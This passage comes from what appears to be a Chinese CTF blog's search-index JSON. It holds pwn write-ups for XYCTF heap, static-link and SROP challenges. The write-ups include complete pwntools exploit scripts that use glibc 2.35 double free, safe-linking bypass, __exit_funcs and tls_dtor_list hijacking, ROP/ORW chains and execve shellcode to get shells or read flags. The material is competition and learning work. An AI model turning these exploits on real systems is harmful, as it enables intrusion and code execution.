u64(res[:8])-2019072 print(\\\"base_libc:\\\",hex(base_libc)) res = view(3,0x10) base_heap = u64(res[:8]) - 1216 print(\\\"base_heap:\\\",hex(base_heap)) # 开始构造一个chunk处于fastbin中情况 for i in range(8): delete(i) delete(10) delete(11) print(\\\"占用的已经删除\\\") # 要实现tcache满 然后fastbin中存在 for i in range(7): add(i,0x78) for i in range(7,14): add(i,0x120) # prev_size size fd bk chunk_addr = base_heap fakechunk = b\\\"a\\\"*16+p64(0)+p64(721)+p64(base_heap+5696)+p64(base_heap+5696)+p64(base_heap+5664)*5 add(14,0x20) # 合并chunk add(15,0x120) edit(15,fakechunk) add(16,0x78) # 用于覆写 add(17,0x138) # 用于合并 add(18,0x120) add(19,0x20) for i in range(14): delete(i) delete(15) delete(16) # delete(1) delete(19) edit(17,b\\\"a\\\"*0x130+p64(720)+b\\\"\\\\x30\\\") print(\\\"base_heap:\\\",hex(base_heap)) print(\\\"base_libc:\\\",hex(base_libc)) delete(18) print(\\\"base_heap:\\\",hex(base_heap)) print(\\\"base_libc:\\\",hex(base_libc)) add(20,0x170) # 构造到malloc hook edit(20,b\\\"a\\\"*0x100+p64(0x130)+p64(0x80)+p64(base_libc+0x1ecb70-0x10)) print(\\\"base_heap:\\\",hex(base_heap)) print(\\\"base_libc:\\\",hex(base_libc)) for i in range(21,30): add(i,0x78) edit(29,p64(0xe3b01+base_libc)) add(30,0x20) ia() \"]},\"489\":{\"h\":\"ptmalloc2_its_myheap\",\"t\":[\"这题利用的一个head chunk进行记录信息 然后一个content chunk记录内容 而且没有对content chunk的size进行限制\",\"并且最重要的是在free的时候没有对chunk指针进行清空 这样我们可以实现uaf\",\"输出chunk内容的时候也是根据我们输入的size来进行输出的 所以可以泄露大量信息\",\"有一个gift函数 输出了libc地址 我们可以直接劫持gift函数和hello_world字符串来实现getshell\"]},\"490\":{\"h\":\"劫持head chunk\",\"t\":[\"由于信息都是通过head chunk进行的记录 所以我们直接劫持head chunk就可以实现任意free了 因为在free head chunk的时候会同步free head chunk记录的buf指针 我们劫持head chunk就可以任意修改buf指针完成任意free 这样我们可以轻松构造一个double free 实现任意写操作\",\"触发fastbin的合并\",\"我们可以让head chunk进入fastbin链中 然后通过申请一个largebin chunk触发合并机制 然后让这些chunk合并进入unsortedbin 我们再申请为 content chunk这样我们可以对这些原本的head chunk进行劫持\",\"构造double free\",\"任意free 让fastbin链中第二个chunk free来触发double free 劫持bss段数据\"]},\"491\":{\"h\":\"脚本\",\"t\":[\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') # context.terminal = ['byobu', 'sp', '-h'] # file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 64814 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+34\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def add(index,size,content): ru(b\\\">>> \\\") sl(b\\\"1\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) ru(b\\\"[?] Enter chunk size: \\\") sl(str(size).encode()) ru(b\\\"[?] Enter chunk data: \\\") sd(content) print(f\\\"----------\\\\n添加index为:{index}的chunk\\\\n----------\\\") def delete(index): ru(b\\\">>> \\\") sl(b\\\"2\\\") ru(b\\\"[?] Enter chunk id: \\\") sl(str(index).encode()) print(f\\\"----------\\\\n删除index为{index}的chunk\\\\n----------\\\") def view(index): ru(b\\\">>> \\\") sl(b\\\"3\\\") ru(b\\\"[?] Enter chunk id: \\\") sl(str(index).encode()) res = rc(0x100) return res def gift(): ru(b\\\">>> \\\") sl(b\\\"114514\\\") return (ru(b\\\"\\\\n\\\")) def getData(bytes): data = [] for i in range(int(len(bytes)/8)): try: data.append(u64(bytes[i*8:(i+1)*8])) except: print(\\\"非预期数据\\\") return data # fastbin 的合并机制需要 在申请large chunk时 # 创建unsortedbin大小占满 并且多两个chunk for i in range(6): # 0x110大小chunk 8号就是我们要修改的chunk add(i,0x18,b\\\"a\\\") for i in range(6): delete(i) # 此时index为6的获取了 各个链的chunk add(6,0x500,b\\\"a\\\") print(\\\"获取一个大chunk装了heap\\\") res = view(6) addr_slice = getData(res) # 0xae4400 - 0xae4000 0x1baf400 base_heap = addr_slice[14] - 0x400 print(\\\"base_heap:\\\",hex(base_heap)) # x/10a &chunk_list 前6号占满 但是前五个isused为0 # 开始构造double free 先是取回所有的tcache 再占满tcache for i in range(5): add(i,0x18,b\\\"a\\\") for i in range(5): delete(i) # 此时fastbin有三个 tcache占满 我们malloc一个巨无霸然后就可以覆写fastbin fastbin情况:0xacf8e0 —▸ 0xacf8c0 —▸ 0xacf8a0 ◂— 0x0 print(\\\"占满tcache\\\") # chunk_list[4] 对应 这里paload偏移32位置 # 此时chunk_list使用情况: 6 7 处于使用状态 # 如果free则是free chunk_list[4] 所以我们要构造好这个chunk 让它绕过安全检测 所以我们构造size和prev_inuse位 然后再构造里面的fd让它指向fastbin chunk中第二个chunk fakechunk = {} fakechunk[\\\"size\\\"] = 0x31 fakechunk[\\\"prev_size\\\"] = 0 # 这里随意 fakechunk[\\\"chunk_list_size\\\"] = 0x20 fakechunk[\\\"isUsed\\\"] = 1 # 看下面的解释 fakechunk[\\\"buff\\\"] = base_heap+0xd10 # 要free的是:0x1279d00 链子:0x1279d20 —▸ 0x1279d00 变成:0x1279d00 —▸ 0x1279d20 ◂— 0x1279d00 add(7,0x430,b\\\"aaaaaaaa\\\"*2+p64(fakechunk[\\\"prev_size\\\"])+p64(fakechunk[\\\"size\\\"])+p64(fakechunk[\\\"chunk_list_size\\\"])+p64(fakechunk[\\\"isUsed\\\"])+p64(fakechunk[\\\"buff\\\"])+p64(0)+p64(0x20)) print(\\\"成功构造fake chunk \\\\ndouble free 的chunk指针:\\\",hex(fakechunk[\\\"buff\\\"])) # 构造两个fastbin的情况 for i in range(8,12): add(i,0x18,b\\\"a\\\") add(12,0x48,b\\\"a\\\") for i in range(8,13): delete(i) # fastbin:0x1603d20 —▸ 0x1603d00 heapbase:0x1603000 所以构造一个0x1603d00被free的情况 # 然后glibc 2.35版本下有fd加密 需要:堆地址>>12然后 ^我想要构造的fd print(\\\"构造成功两个fastbin的情况\\\") delete(4) for i in range(8,12): add(i,0x18,p64(base_heap>>12^0x404070)) add(13,0x38,b\\\"a\\\") res = gift() base_libc = int(res[-15:-1],16) -0x80E50 system_addr = base_libc +0x50D70 print(\\\"base_libc:\\\",hex(base_libc)) print(\\\"system_addr:\\\",hex(system_addr)) add(14,0x18,b\\\"/bin/sh\\\\x00\\\".ljust(8,b\\\"\\\\x00\\\")+p64(0)+p64(system_addr)) gift() ia() \"]},\"492\":{\"h\":\"ptmalloc2 it's myheap pro (glibc2.35下的exit函数打法)\"},\"493\":{\"h\":\"审题\",\"t\":[\"add函数 malloc一个0x18的chunk(0x20) 属性分别对应:size isUsed buff 并且仅在创建的时候可以写入数据 并且没有检测这个index是否在使用 所以我们可以对一个index无限malloc\",\"image-20240418005442527\",\"delete函数 直接free记录信息的chunk和我们的内容体chunk(buff) 并且没有清空\",\"image-20240418005502800\",\"view函数 直接write出size大小的内容 存在泄露\",\"image-20240418005523801\",\"atexit函数\",\"image-20240418131700409\"]},\"494\":{\"h\":\"大致利用原理:\",\"t\":[\"这里先粗略写一下原理 后面细讲 整个利用原理不算难但是细节很多很多地方需要微调\",\"泄露libc heap地址\",\"通过malloc 9个128 来申请0x90大小的chunk 然后free掉 让chunk进入unsortedbin中 再申请回来 通过write函数直接泄露libc地址 和heap地址\",\"伪造fake chunk（消耗topchunk触发fastbin的合并）\",\"或者通过向scanf输入大量数据触发fastbin合并 因为scanf在接受大量数据的时候会申请一个largebin\",\"因为题目中存在isUsed 有了这个就阻止了我们double free所以我们让记录头信息的chunk进入fastbin中 并且通过消耗空topchunk 触发fastbin的合并机制 让fastbin进入unsortedbin中 再通过分割机制 让原本的信息头chunk成为我们的内容chunk(buff) 通过向chunk写入内容来劫持信息头chunk 改写isUsed和buff指针 来实现任意地址的free 从而实现double free\",\"劫持__exit_funcs链表 实现在exit的时候任意函数的调用 通过两次double free 第一次泄露tls中的key 第二次负责修改__exit_funcs链表\",\"大概思路:exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)\",\"[原创] Glibc-2.35下对tls_dtor_list的利用详解-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"这俩个大佬提供了两种思路 我这边采用的Arahat0佬的劫持__exit_funcs链表的方式\"]},\"495\":{\"h\":\"泄露libc heap\",\"t\":[\"最简单的一步\",\"简单地通过让chunk进入tcache中 然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址\",\"for i in range(9): add(i,128,b\\\"a\\\"*0x18) for i in range(9): delete(i) # 泄露出chunk add(0,0x68,b\\\"a\\\"*8) res = view(0) base_heap = u64(res[2*8:3*8]) -1936 base_libc = u64(res[5*8:6*8]) -2206944 \",\"chunk进入unsortedbin\",\"image-20240418132947766\",\"free 8时 unsortedbin进入topchunk 但是此时保留了fd 等信息 我们只需要malloc回来即可\",\"image-20240418133015055\",\"申请回来\",\"image-20240418133239908\",\"然后write直接泄露即可\"]},\"496\":{\"h\":\"伪造fake chunk\",\"t\":[\"最消耗时间的一步\",\"这里比较麻烦的就是fakechunk 这里我们将记录信息的chunk称之为头chunk 记录内容chunk的size isUsed point\",\"point指向的就是内容chunk\",\"为了绕过isUsed的检测 我们可以利用delete后没有清空的特性将原本的头chunk覆盖掉 这样就能随意控制isUsed和point了 实现任意free 所以我们选择触发fastbin的合并 来让原本的头chunk之间相互合并 然后我们通过malloc指定大小的chunk来分割这个chunk 控制内容chunk刚好为原本某一个的头chunk\"]},\"497\":{\"h\":\"示意图\",\"t\":[\"image-20240418134333731\",\"这样我们就可以向content chunk写入内容劫持head chunk了 原理很简单 但是现在就要想办法触发fastbin中的合并机制了\"]},\"498\":{\"h\":\"fastbin合并机制\",\"t\":[\"范围:2.35\",\"我们可以通过申请large bin chunk 来触发合并\",\"我们可以通过让topchunk消耗完毕 然后触发合并\",\"由于我们最大申请128 也就是0x90大小的chunk 显然第一种我们是没办法直接申请large chunk\",\"Arahat0师傅提醒俺 我们可以通过向scanf输入大量数据 来让scanf malloc一个large chunk 然后触发合并 但是同时也会导致缓冲区一堆数据导致后续的scanf失灵 所以为了方便控制 我选择了将topchunk消耗完毕触发合并的方式\",\"连续申请大量chunk 消耗topchunk到size为一个较小值 然后在最后申请chunk 并且free chunk 让chunk进入fastbin链中 然后malloc一个较大的chunk 彻底消耗topchunk 触发fastbin的合并\",\"# tcache 0x20 0x90均存满 # 剩下0xf3c7d0 for i in range(760): add(14,128,b\\\"a\\\"*0x18) for i in range(6): add(i,0x18,b\\\"a\\\"*0x8) # 防止fastbin合并后直接被topchunk合并 add(7,8,b\\\"a\\\"*8) for i in range(6): delete(i) add(14,128,b\\\"a\\\"*8) add(14,0x30,b\\\"a\\\"*8) \",\"合并之前\",\"image-20240418151026231\",\"合并后\",\"image-20240418151102406\"]},\"499\":{\"h\":\"构造fakecchunk\",\"t\":[\"fakechunk = {} fakechunk[\\\"size\\\"] = p64(0x21) fakechunk[\\\"prev_size\\\"] = p64(0) fakechunk[\\\"chunk_list_size\\\"] = p64(0x100) fakechunk[\\\"isUsed\\\"] = p64(1) // 为触发泄露tls+0x30的double free的fastbinchunk地址 fakechunk[\\\"buff\\\"] = p64(fd) # 已经完成覆写 free index5则可实现任意free add(14,0x58,b\\\"a\\\"*16+fakechunk[\\\"prev_size\\\"]+fakechunk[\\\"size\\\"]+fakechunk[\\\"chunk_list_size\\\"]+fakechunk[\\\"isUsed\\\"]+fakechunk[\\\"buff\\\"]) \",\"此时index为5 就是我们劫持的头chunk 这里的fd就是我们后面要free的任意chunk\",\"image-20240418151731938\"]},\"500\":{\"h\":\"泄露tls+0x30\",\"t\":[\"由于要泄露tls+0x30处的地址 从而来泄露出key值 方便我们去劫持exit_funcs链表 所以我们需要构造一个double free来malloc下来tls附近的内存区域\",\"难点\",\"我们需要控制内存对齐 并且还不能破坏到了canary的值 所以我们double free劫持的chunk大小需要够大\",\"实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应 如果直接将fd填写为tls处地址 后续的malloc失效 因为tls处的fd位置我们并没有办法控制 大概率会是内存不对齐/内存不可写 所以我们需要后续的malloc\",\"glibc2.35下存在fd加密机制 我们的fd需要经过与(base_heap>>12)进行异或操作 才是合法的fd才能够被正常解析 而且经过测试仿佛这里的base_heap会因为我们消耗topchunk一次而发生细微的改变 所以需要gdb手动调试计算出偏差\",\"# 构造一个double free for i in range(6,11): add(i,0x18,b\\\"a\\\"*16) # 这个chunk是以前为了当作跳板的chunk 但是后面切换了思路没有用了 为了不影响后续的heap计算就没有删除 add(14,0x68,p64(0)+p64(0x100)+p64((xor-0x21)^(tls+0x30))) for i in range(6,11): delete(i) delete(5) for i in range(7): add(i,0x48,b\\\"a\\\"*8) add(7,0x48,p64((xor)^(tls))) for i in range(2): add(i,0x48,b\\\"a\\\"*8) add(0,0x48,b\\\"\\\\x00\\\") # 泄露tls中信息 res = view(0) \",\"首先是在fastbin上构造出两个以上的chunk 然后free第二个chunk 来绕过fastbin中检查double free的机制（fastbin会检查你free的是否为第一个chunk）\",\"if (__builtin_expect(old == p, 0)) malloc_printerr(\\\"double free or corruption (fasttop)\\\"); p->fd = PROTECT_PTR(&p->fd, old); *fb = p; \",\"image-20240420123457567\",\"然后将利用开始构造好的fakechunk进行free\",\"delete(5) \",\"image-20240420123602766\"]},\"501\":{\"h\":\"fd加密机制\",\"t\":[\"glibc高版本加入的fd加密机制 让我们没办法直接覆盖fd 绕过也很简单泄露heap地址即可\",\"fd需要是heap基地址^目标地址\"]},\"502\":{\"h\":\"劫持exit_funcs链表\",\"t\":[\"最难崩的一步 因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double free 然后指向exit_func处 进行覆写\",\"本地打这个感觉还行 但是打远程的时候我脚本足足要跑20分钟 并且还因为比赛方平台网络不是特别好 导致我反复失败 最终跑了一晚上才跑出来\",\"难点 \",\"因为上一次double free 导致tcache 中一条链已经存在一个无效的chunk地址(大概率不对齐) 所以我们下一次double free的时候就不能选择这个size大小的链了\",\"# size: 0x20c30 for i in range(758): add(14,128,b\\\"a\\\"*8) for i in range(11): add(i,0x18,b\\\"a\\\"*8) add_with_no_chunk(14) for i in range(11): delete(i) # 将topchunk消耗空触发合并 add(14,0x68,b\\\"a\\\"*8) # 指定free index 6 可以实现任意free # free_chunk就是后续构造double free的chunk地址 free_chunk = base_heap+271376+0x10 add(14,128,b\\\"a\\\"*8*4+p64(0)+p64(0x31)+p64(0x100)+p64(1)+p64(free_chunk)) # 填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数 for i in range(6): add(i,0x68,b\\\"/bin/sh\\\\x00\\\") for i in range(7,13): add(i,0x68,b\\\"/bin/sh\\\\x00\\\") for i in range(6): delete(i) for i in range(7,13): delete(i) # 触发double free delete(6) for i in range(7): add(i,0x68,b\\\"a\\\"*8) # 将fd指向exit_function地址处 add(i,0x68,p64((xor+0x21)^exit_function)) add(0,0x68,b\\\"a\\\"*8) add(0,0x68,b\\\"/bin/sh\\\\x00\\\") res = getData(res) # 获取key的值 res = res[6] # 计算出key加密后的地址 manba = remove_high_digits(rol(0x401700^res),16) addr = remove_high_digits(rol(system_addr^res),16) print(\\\"key:\\\",hex(res)) print(\\\"libc_base\\\",hex(base_libc)) print(\\\"heap_base\\\",hex(base_heap)) print(\\\"system_addr\\\",hex(system_addr)) print(\\\"exit_function:\\\",hex(exit_function)) print(\\\"addr\\\",hex(addr)) add(0,0x68,p64(4)+p64(addr)+p64(base_heap+0x42420)) ru(b\\\">>> \\\") sl(b\\\"5\\\") print(\\\"key:\\\",hex(res)) print(\\\"libc_base\\\",hex(base_libc)) print(\\\"heap_base\\\",hex(base_heap)) print(\\\"system_addr\\\",hex(system_addr)) print(\\\"exit_function:\\\",hex(exit_function)) print(\\\"addr\\\",hex(addr)) ia() \"]},\"503\":{\"h\":\"ptmalloc2 it's myheap plus（orw+exit）\",\"t\":[\"相对于ptmp只是多了一个sandbox限制 就和Arahat0师傅文章中的流程一模一样 多了一个orw的利用 大致原理都是相同的\",\"值得一提的是本地通了但是远程打了好久没通后面发现远程不让我以rw的方式打开flag 而是只允许我以r方式打开\",\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] # file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 49979 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+34\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def debug(): gdb.attach(p,\\\"b *main+34\\\") input(\\\"输入请继续\\\") def add_with_no_chunk(index): ru(b\\\">>> \\\") sl(b\\\"1\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) ru(b\\\"[?] Enter chunk size: \\\") sl(b\\\"-1\\\") return rl() def add(index,size,content): ru(b\\\">>> \\\") sl(b\\\"1\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) ru(b\\\"[?] Enter chunk size: \\\") sl(str(size).encode()) ru(b\\\"[?] Enter chunk data: \\\") sd(content) print(f\\\"----------\\\\n添加index为:{index}的chunk\\\\n----------\\\") def delete(index): ru(b\\\">>> \\\") sl(b\\\"2\\\") ru(b\\\"[?] Enter chunk id: \\\") sl(str(index).encode()) print(f\\\"----------\\\\n删除index为{index}的chunk\\\\n----------\\\") def view(index): ru(b\\\">>> \\\") sl(b\\\"3\\\") ru(b\\\"[?] Enter chunk id: \\\") sl(str(index).encode()) res = rc(0x68) return res def gift(): ru(b\\\">>> \\\") sl(b\\\"114514\\\") return (ru(b\\\"\\\\n\\\")) def getData(bytes): data = [] for i in range(int(len(bytes)/8)): try: data.append(u64(bytes[i*8:(i+1)*8])) except: print(\\\"非预期数据\\\") return data def rol(value): # 模拟 64 位无符号整数 mask = 0xFFFFFFFFFFFFFFFF return ((value << 0x11) | (value >> (64 - 0x11))) & mask def remove_high_digits(hex_num, desired_length): hex_str = hex(hex_num)[2:] # 将十六进制数字转换为字符串，并去掉开头的\\\"0x\\\" if len(hex_str) <= desired_length: return int(hex_str,16) # 如果字符串长度小于等于所需长度，直接返回 else: return int(hex_str[-desired_length:],16) # 否则，返回去掉最高位后的字符串 # 泄露出chunk for i in range(7): add(i,128,b\\\"a\\\"*8) for i in range(7,10): add(i,128,b\\\"a\\\"*8) for i in range(9): delete(i) for i in range(7): add(i,128,b\\\"\\\\x00\\\") add(7,128,b\\\"\\\\x00\\\") res = view(7) # data = view(5) base_libc = u64(res[8:16]) - 2207216 print(\\\"base_libc\\\",hex(base_libc)) delete(9) delete(10) # 泄露heap for i in range(7): add(i,128,b\\\"a\\\"*8) add(7,128,b\\\"a\\\"*8) add(8,0x38,b\\\"a\\\"*8) add(9,128,b\\\"a\\\"*8) add(10,0x38,b\\\"a\\\"*8) for i in range(7): delete(i) delete(7) delete(8) delete(9) # print(\\\"base_libc\\\",hex(base_libc)) for i in range(7): add(i,128,b\\\"\\\\x00\\\") # debug() # 0x5633731e9da0 add(7,0x58,b\\\"\\\\x00\\\") res = view(7) base_heap = u64(res[8:16])-7856 for i in range(719): add(15,128,b\\\"a\\\"*8) #0x3b0 for i in range(12): add(i,0x68,b\\\"a\\\"*8) for i in range(11): delete(i) add(14,0x38,b\\\"\\\\x00\\\") add(14,128,b\\\"\\\\x00\\\") fd = 0x100 add(14,0x58,(b\\\"a\\\"*(0x40-0x10))+p64(0)+p64(0x91)+p64(0x100)+p64(1)+p64(base_heap+0xb20+0x10)) # index:10 # 构造fastbin for i in range(9): add(i,0x68,b\\\"a\\\"*8) for i in range(9): delete(i) # 0x5600edb1db20-0x5600edb1d000 delete(10) for i in range(7): add(14,0x68,b\\\"/bin/sh\\\\x00\\\") tls = base_libc -10432 xor = ((base_heap)>>12) add(14,0x68,p64(tls^xor)) add(14,0x68,p64(tls^xor)) add(14,0x68,p64(tls^xor)) add(14,0x68,p64(base_libc-0x28c0)+p64(base_libc-0x1ea0)) res = view(14) # 0x7fe867b61160 data = getData(res) # print(data) for i in data: print(hex(i)) canary = data[5] key = data[6] for i in range(759): add(14,128,b\\\"/bin/sh\\\\x00\\\") for i in range(13): add(i,0x48,b\\\"/bin/sh\\\\x00\\\") for i in range(13): delete(i) add(14,128,b\\\"a\\\"*8) add(14,0x58,b\\\"a\\\"*8) # fd add(14,128,p64(0)+p64(0x100)+p64(0x100)+p64(1)+p64(base_heap+0x42050+0x10)) # index 8 for i in range(8): add(i,0x78,b\\\"/bin/sh\\\\x00\\\") for i in range(9,13): add(i,0x78,b\\\"/bin/sh\\\\x00\\\") for i in range(8): delete(i) for i in range(9,12): delete(i) delete(8) write = p64(base_libc+0x114870) open64 = p64(base_libc+0x1144E0 ) read = p64(base_libc+0x1147D0) pop_rdi = p64(base_libc+0x2a3e5) pop_rsi = p64(base_libc+0x2be51) pop_rdx_r12 = p64(base_libc+0x11f2e7) pop_rsp = p64(base_libc+0x35732) leave = base_libc+0x133BEA flag = base_heap+0x1398 r_s = base_heap+0x1390 buff = base_heap+0xf40 sendline = base_libc+0x119170 addr = rol(leave^key) pop_rcx =base_libc +0x3d1ee for i in range(4): add(i,0x78,b\\\"r\\\\x00\\\".ljust(8,b\\\"\\\\x00\\\")+b\\\"./flag\\\\x00\\\".ljust(8,b\\\"\\\\x00\\\")) add(4,0x78,b\\\"\\\\x00\\\"*0x60) add(5,0x78,b\\\"a\\\") add(6,0x78,pop_rdi+p64(1)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x40)+p64(0)+write) tls_dtor_list = tls-88 add(7,0x78,p64((xor+0x42)^(tls_dtor_list-8))) add(14,0x78,b\\\"\\\\x00\\\") add(14,0x78,b\\\"\\\\x00\\\") add(14,0x78,p64(0)+p64(base_heap+0x42260)) # add(14,128,p64(addr)+pop_rdi+p64(1)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x30)+p64(0)+write) add(14,128,p64(addr)+pop_rdi+p64(flag)+pop_rsi+p64(0)+open64+pop_rdi+p64(3)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x30)+p64(0)+read+pop_rsp+p64(base_heap+0xba0)) print(\\\"tls_dtor_list\\\",hex(tls_dtor_list)) print(\\\"canary\\\",hex(canary)) print(\\\"key\\\",hex(key)) print(\\\"base_heap\\\",hex(base_heap)) print(\\\"base_libc\\\",hex(base_libc)) print(\\\"addr\\\",hex(addr)) print(\\\"leave:\\\",hex(leave)) # debug() # 0x556f210bd050-0x556f2107b000 # print(\\\"canary\\\",hex(canary)) # print(\\\"key\\\",hex(key)) # print(\\\"base_heap\\\",hex(base_heap)) # print(\\\"base_libc\\\",hex(base_libc)) # debug() ru(b\\\">>> \\\") sl(b\\\"4\\\") ia() \"]},\"504\":{\"h\":\"static_link\",\"t\":[\"静态链接 我们直接通过mprotect函数 开一块内存出来执行shellcode即可\",\" import time from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"xyctf.top\\\" port = 33168 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b main\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) pop_rdi = p64(0x401f1f) pop_rsi = p64(0x409f8e) pop_rdx = p64(0x451322) ret = p64(0x40101a) read = p64(0x447580 ) mprotect = p64(0x4482C0) ru(b\\\"static_link? ret2??\\\\n\\\") bss_addr = 0x4C8000 payload = b\\\"a\\\"*0x28+pop_rdi+p64(bss_addr)+pop_rsi+p64(4096)+pop_rdx+p64(7)+mprotect+pop_rdi+p64(0)+pop_rsi+p64(bss_addr)+pop_rdx+p64(50)+read+p64(bss_addr) sd(payload) time.sleep(20) shellcode =b\\\"\\\\x31\\\\xf6\\\\x48\\\\xbb\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x2f\\\\x2f\\\\x73\\\\x68\\\\x56\\\\x53\\\\x54\\\\x5f\\\\x6a\\\\x3b\\\\x58\\\\x31\\\\xd2\\\\x0f\\\\x05\\\" sd(shellcode) ia() \"]},\"505\":{\"h\":\"simple_srop\",\"t\":[\"srop+orw 注意一下每个指令之间执行的间距就可以了\",\"from pwn import * import time context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 53647 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b main\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) bss = 0x404060+0x100 bss_addr = p64(bss) ret_addr = p64(0x40101a) sigreturn_syscall = p64(0x401296) syscall = 0x40129D #调用read在bss段部署payload sigFrame=SigreturnFrame() sigFrame.rax=0 sigFrame.rdi=0 sigFrame.rsi=bss sigFrame.rdx=0x700 # 加0x8是因为这个位置放./flag字符串 sigFrame.rsp = bss+0x8 sigFrame.rip=syscall payload = b\\\"a\\\"*0x28 + sigreturn_syscall + bytes(sigFrame) print(\\\"bss段:\\\",hex(bss)) sd(payload) # 第二次构造 orw sigFrame2=SigreturnFrame() sigFrame2.rax=2 # ./flag sigFrame2.rdi=bss sigFrame2.rsi=0 sigFrame2.rdx=0 # 264是调试出来的 sigFrame2.rsp = bss+0x108 sigFrame2.rip=syscall # read函数 sigFrame3=SigreturnFrame() sigFrame3.rax=0 sigFrame3.rdi=3 # 随便写的位置 sigFrame3.rsi=bss+0x400 sigFrame3.rdx=0x36 sigFrame3.rsp = bss+520 sigFrame3.rip=syscall # write函数 sigFrame4=SigreturnFrame() sigFrame4.rax=1 sigFrame4.rdi=1 # flag位置 sigFrame4.rsi=bss+0x400 sigFrame4.rdx=0x36 sigFrame4.rsp = bss+520 sigFrame4.rip=syscall payload =b\\\"./flag\\\\x00\\\".ljust(8,b\\\"\\\\x00\\\")+ sigreturn_syscall + bytes(sigFrame2) +sigreturn_syscall+bytes(sigFrame3)+sigreturn_syscall+bytes(sigFrame4) print(\\\"open+read的长度:\\\",len(payload)) input(\\\"第二次输入\\\") sd(payload) time.sleep(10) ia() \"]},\"506\":{\"h\":\"Posts\"},\"507\":{\"h\":\"Development\"},\"508\":{\"h\":\"Android\"},\"509\":{\"h\":\"Pwn\"},\"510\":{\"h\":\"密码学\"},\"511\":{\"h\":\"G Olang\"},\"512\":{\"h\":\"Golang\"},\"513\":{\"h\":\"Docker\"},\"514\":{\"h\":\"Git\"},\"515\":{\"h\":\"Python\"},\"516\":{\"h\":\"Heap\"},\"517\":{\"h\":\"Io File\"},\"518\":{\"h\":\"Linux\"},\"519\":{\"h\":\"Php Pwn\"},\"520\":{\"h\":\"Stack\"},\"521\":{\"h\":\"Tool Skill\"},\"522\":{\"h\":\"Hgame Week2\"},\"523\":{\"h\":\"Re\"},\"524\":{\"h\":\"Nssctf\"},\"525\":{\"h\":\"Competition\"},\"526\":{\"h\":\"Xyctf\"}},\"dirtCount\":0,\"index\":[[\"密码学\",{\"0\":{\"510\":1}}],[\"静态链接\",{\"1\":{\"504\":1}}],[\"位无符号整数\",{\"1\":{\"503\":1}}],[\"位置写第三个chunk\",{\"1\":{\"396\":1}}],[\"位置写入指针指向第二个chunk\",{\"1\":{\"396\":1}}],[\"位置\",{\"1\":{\"347\":2,\"365\":1}}],[\"输入请继续\",{\"1\":{\"503\":1}}],[\"输出了libc地址\",{\"1\":{\"489\":1}}],[\"输出chunk内容的时候也是根据我们输入的size来进行输出的\",{\"1\":{\"489\":1}}],[\"输出\",{\"1\":{\"467\":1}}],[\"输出类名\",{\"1\":{\"126\":1}}],[\"输出结果\",{\"1\":{\"121\":1,\"123\":1}}],[\"值得一提的是本地通了但是远程打了好久没通后面发现远程不让我以rw的方式打开flag\",{\"1\":{\"503\":1}}],[\"相对于ptmp只是多了一个sandbox限制\",{\"1\":{\"503\":1}}],[\"相当于\",{\"1\":{\"451\":1}}],[\"相当于是告诉我们plt\",{\"1\":{\"451\":1}}],[\"相当于让\",{\"1\":{\"403\":1}}],[\"相当于为未来可能的值占位的作用\",{\"1\":{\"280\":1}